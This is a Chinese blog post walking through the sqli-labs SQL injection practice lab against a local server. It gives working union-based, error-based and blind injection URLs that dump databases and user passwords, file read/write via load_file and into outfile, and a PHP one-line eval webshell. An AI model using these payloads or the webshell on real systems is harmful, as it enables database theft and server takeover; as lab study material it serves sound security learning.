<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>SQL注入 | Flyme</title>
  <meta name="author" content="西伯利亚狼">
  
  <meta name="description" content="奋斗小青年的逆袭之路一直进行中">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="SQL注入"/>
  <meta property="og:site_name" content="Flyme"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Flyme" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.0.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Flyme</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> SQL注入</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>SQL注入漏洞<code>主要形成的原因</code>是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”<code>拼接</code>到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>在构建代码时，一般会从如下几个方面的策略来<strong>防止</strong>SQL注入漏洞：</p>
<ul>
<li>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
<li>2.使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
<li>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</li>
</ul>
<a id="more"></a>

<h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在sqli-labs代码中，加入以下：</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="如何报错信息"><a href="#如何报错信息" class="headerlink" title="如何报错信息"></a>如何报错信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br><span class="line">1&quot;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>

<h2 id="尝试语句"><a href="#尝试语句" class="headerlink" title="尝试语句"></a>尝试语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br><span class="line">1&quot;</span><br><span class="line">1&#39;))</span><br><span class="line">1&quot;))</span><br><span class="line"></span><br><span class="line">&#39;</span><br><span class="line">&#39;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;</span><br><span class="line">&quot;)</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200521162142198.png" alt="image-20200521162142198"></p>
<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p>当没有错误提示时， 那么我们只能靠猜测进行注入  </p>
<ul>
<li>延时注入：</li>
</ul>
<h2 id="sql语句的写法"><a href="#sql语句的写法" class="headerlink" title="sql语句的写法"></a>sql语句的写法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;    Less1</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;        Less2</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;        Less3</span><br><span class="line"></span><br><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;        #Less4:使用1&quot;产生错误-- use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1，表明sql 对 id 参数进行了 “” 和 () 的包装</span><br><span class="line"></span><br><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;                                        Less-6</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;    Less-7</span><br><span class="line"></span><br><span class="line">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;                                    Less-14</span><br><span class="line">$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; </span><br><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;$uname and password&#x3D;$passwd LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql 查询语句：</span><br><span class="line"></span><br><span class="line">查库： select schema_name from information_schema.schemata;</span><br><span class="line">查表： select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;;</span><br><span class="line">查列： select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">查字段： select username,password from security.users;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">left()函数：  left(database(),1)&#x3D;‘s’                     left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</span><br><span class="line"></span><br><span class="line">regexp函数：select user() regexp ‘r’                 user()的结果是root，regexp为匹配root的正则表达式</span><br><span class="line"></span><br><span class="line">like函数： select user() like ‘ro%’                        匹配与regexp相似。</span><br><span class="line"></span><br><span class="line">substr(a,b,c)   select substr() XXXX                       substr(a,b,c)从位置b开始，截取a字符串c位长度</span><br><span class="line"></span><br><span class="line">ascii()                                      将某个字符串转化为ascii值  </span><br><span class="line"></span><br><span class="line">chr(数字)   或者是ord(‘字母’)    使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line">对于security数据库：</span><br><span class="line"></span><br><span class="line">select left(database(),1)&#x3D;‘s’;   前1位是否是s</span><br><span class="line"></span><br><span class="line">select database() regexp ‘s’;  匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select database() like ‘s%’;     匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select substr((select database()),1,1)&#x3D;&#39;s’; 匹配第一个字符是否是 s</span><br><span class="line"></span><br><span class="line">select substr((select database()),1,3)&#x3D; ‘sec’; 匹配前三个个字符是否是 sec</span><br><span class="line"></span><br><span class="line">select ascii(substr((select database()),1,1));    直接回显115  或者是：</span><br><span class="line"></span><br><span class="line">select ascii(substr((select database()),1,1)) &gt; 110;  如果大于110，就会返回1，否则返回0.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521173132112.png" alt="image-20200521173132112"></p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521173732135.png" alt="image-20200521173732135"></p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521174643694.png" alt="image-20200521174643694"></p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521175233603.png" alt="image-20200521175233603"></p>
<p>分析：</p>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;查看 secure-file-priv 当前的值，如果显示为NULL，则需要打开</span><br><span class="line">C:\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv&#x3D;“&#x2F;”。</span><br><span class="line"></span><br><span class="line">一句话木马：php版本：&lt;?php @eval($_POST[“crow”]);?&gt; 其中crow是密码</span><br><span class="line">补充：</span><br><span class="line"></span><br><span class="line">load_file()  读取本地文件  select load_file(&#39;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’);</span><br><span class="line"></span><br><span class="line">                                      </span><br><span class="line">into outfile 写文件                       </span><br><span class="line">用法： select &#39;mysql is very good&#39; into outfile &#39;test1.txt‘;</span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\MySQL\data</span><br><span class="line">                                      </span><br><span class="line">或者是select &#39;crow 666&#39; into outfile &#39;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’;  </span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\WWW\sqli\Less-7</span><br><span class="line">注意事项： \\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IF(condition,A,B)如果条件condition为true，则执行语句A，否则执行B</span><br><span class="line"></span><br><span class="line">例： select if(1&gt;2,4,5);   返回的结果是5.（如果是在mysql命令行中使用，首先要use xxx数据库才行）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200521234902356.png" alt="image-20200521234902356"></p>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">参考资料：https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;125599.htm</span><br><span class="line">                      https:&#x2F;&#x2F;www.jb51.net&#x2F;article&#x2F;125607.htm</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line">改变XML_document中符合XPATH_string的值</span><br><span class="line">而我们的注入语句为：</span><br><span class="line"> select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);</span><br><span class="line">其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb~&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Page-1"><a href="#Page-1" class="headerlink" title="Page-1"></a>Page-1</h1><h2 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1: GET-Error based-Single quotes-String"></a>Less-1: GET-Error based-Single quotes-String</h2><p><img src="/2020/07/13/sqlo-labs/image-20200521125907011.png" alt="image-20200521125907011"></p>
<p>注意此处的<code>id=-1</code>，就会不显示内容的，显示的是union后的内容</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521130407414.png" alt="image-20200521130407414"></p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521130028770.png" alt="image-20200521130028770"></p>
<p>看到<strong>union</strong>是相同的列数，如果是不同的列数会报错的</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200521130118926.png" alt="image-20200521130118926"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’     查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1‘ order by 3--+   查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,3--+ 查看哪些数据可以回显</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,database()--+  查看当前数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,schema_name from information_schema.schemata limit 4,1--+  查看数据库security，通过修改4这个参数从0开始一个个的尝试</span><br><span class="line"></span><br><span class="line">或者是：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 查看所有的数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1--+ 查表，0x7365637572697479是库名</span><br><span class="line"></span><br><span class="line">或者是：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 查看所有的</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,column_name from information_schema.columns where table_name&#x3D;0x7573657273--+ 查询列信息，或者是：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273--+ 查看所以的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1‘ union select 1,2,concat_ws(’~‘,username,password) from security.users limit 1,1--+ 查询一个账号和密码，</span><br><span class="line"></span><br><span class="line">或者是：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+ 直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less2：GET-Error-based-Intiger-based"><a href="#Less2：GET-Error-based-Intiger-based" class="headerlink" title="Less2：GET-Error based-Intiger based"></a>Less2：GET-Error based-Intiger based</h2><p>可以将其中的一些符号进行十六进制话，例如<code>&#39;、~ 与名称（security等等）</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;1’     查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3--+   查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1 union select 1,2,3--+ 查看哪些数据可以回显</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-3-GET-Error-based-Singer-quote-with-twist-string"><a href="#Less-3-GET-Error-based-Singer-quote-with-twist-string" class="headerlink" title="Less-3:GET-Error based-Singer quote with twist-string"></a>Less-3:GET-Error based-Singer quote with twist-string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;1’ 查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(schema_name) from information_schema.schemata --+ 查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割</span><br></pre></td></tr></table></figure>

<p>成功的注入</p>
<p><code>&#39;) or &#39;1&#39;=(&#39;1 ) or 1=1 --+  </code></p>
<h2 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less -4 GET. Error based -Double Quotes -String"></a>Less -4 GET. Error based -Double Quotes -String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;1&quot;查看是否有注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;1”) order by 3--+查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(schema_name) from information_schema.schemata --+查看所有数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 --+查看所有的表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 --+查看所有的列信息</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users --+直接可以得到所有的账号和密码，并且使用~符号进行分割。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有效的payload</p>
<p><code>“) or ”1”=(“1 “) or 1=1 --+  </code></p>
<h2 id="Less-5-：GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-：GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 ：GET-Double Injection-Single Quotes-String"></a>Less-5 ：GET-Double Injection-Single Quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’  查看是否有注入   </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and left((select database()),1)&#x3D;’s’--+ 判断第一位是否是s，然后使用bp进行爆破处理：</span><br><span class="line">    </span><br><span class="line">GET &#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20left((select%20database()),2)&#x3D;%27s§a§%27--+ HTTP&#x2F;1.1</span><br><span class="line">通过返回的长度来确定第二位是多少，最后确定为e，依次类推进行测试。</span><br><span class="line"></span><br><span class="line">或者是使用if来进行判断测试： http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and  ascii(substr((select database()),1,1))&gt;156--+（此时是没有返回的） （这种方法是错误的） 下图有解释</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1‘ and  ascii(substr((select database()),1,1))&gt;110--+  此时返回 you are in…….代表执行成功。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200521191614438.png" alt="image-20200521191614438"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">完整注入流程：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100--+ 通过二分法猜解得到所有的库,红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1),1,1))&gt;1--+  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1),1,1)) &gt;1 --+  通过二分法可猜解users内的字段，其中红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1’  and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1--+继续猜解即可得到字段内的值。</span><br></pre></td></tr></table></figure>

<p><code>ascii(substr((select database()),1,1))&gt; 156 security</code><br>二分法<br>1，156<br>100</p>
<hr>
